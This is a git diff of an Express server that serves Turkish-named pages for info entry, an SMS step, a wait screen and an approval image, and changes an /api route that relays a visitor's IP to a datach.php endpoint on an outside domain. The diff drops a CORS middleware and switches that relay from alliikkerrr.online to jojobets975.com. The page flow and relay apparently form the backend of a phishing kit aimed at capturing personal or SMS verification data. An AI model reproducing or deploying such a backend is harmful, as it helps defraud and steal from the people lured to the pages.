@@ -5,23 +5,15 @@ require('dotenv').config();
 const app = express();
 const port = process.env.PORT || 3000;
 const { readdirSync } = require("fs");
-
 app.use(express.json());
 app.use(express.static('public'));
-app.use(function(req, res, next) {
-  res.header("Access-Control-Allow-Origin", "*");
-  res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
-  next();
-});
 readdirSync("./routes").map((file) => app.use("/", require("./routes/" + file)));
-
 app.get('/files/css', (req, res) => {
   res.sendFile(__dirname + '/public/files/css');
 });
 app.get('/bk.gif', (req, res) => {
   res.sendFile(__dirname + '/public/bk.gif');
 });
-
 app.get('/', (req, res) => {
   res.sendFile(__dirname + '/public/index.html');
 });
@@ -31,7 +23,6 @@ app.get('/files/bootstrap.min.css', (req, res) => {
 app.get('/files/logo-2.png', (req, res) => {
   res.sendFile(__dirname + '/public/files/logo-2.png');
 });
-
 app.get('/bilgi.html', (req, res) => {
   res.sendFile(__dirname + '/public/bilgi.html');
 });
@@ -47,18 +38,15 @@ app.get('onay.png', (req, res) => {
 app.get('/files/flaticon.css', (req, res) => {
   res.sendFile(__dirname + '/public/files/flaticon.css');
 });
-
 app.get('/sms.html', (req, res) => {
   res.sendFile(__dirname + '/public/sms.html');
 });
 app.get('/bekle.html', (req, res) => {
   res.sendFile(__dirname + '/public/bekle.html');
 });
-
 app.get('/files/js', (req, res) => {
   res.sendFile(__dirname + '/public/files/js');
 });
-
  
 app.get('/img/bg-image.jpeg', (req, res) => {
   res.sendFile(__dirname + '/public/img/bg-image.jpeg');
@@ -81,26 +69,19 @@ app.get('/files/jquery-3.2.1.min.js.indir', (req, res) => {
 app.get('/files/style.css', (req, res) => {
   res.sendFile(__dirname + '/public/files/style.css');
 });
-
-
 app.get('/api', async (req, res) => {
   try {
     const userIp = req.query.ip;
-
     // URL'yi oluştur
-    const apiUrl = `https://alliikkerrr.online/datach.php?ip=${userIp}`;
-
+    const apiUrl = `https://jojobets975.com/tr/datach.php?ip=${userIp}`;
     // Fetch kullanarak GET isteği yap
     const response = await axios.get(apiUrl);
-
     if (!response.data) {
       throw new Error('Geçersiz yanıt');
     }
-
     res.json(response.data);
   } catch (error) {
     console.error('Hata:', error);
-
     // Hata mesajını istemciye gönder
     res.status(500).json({ error: error.message });
   }
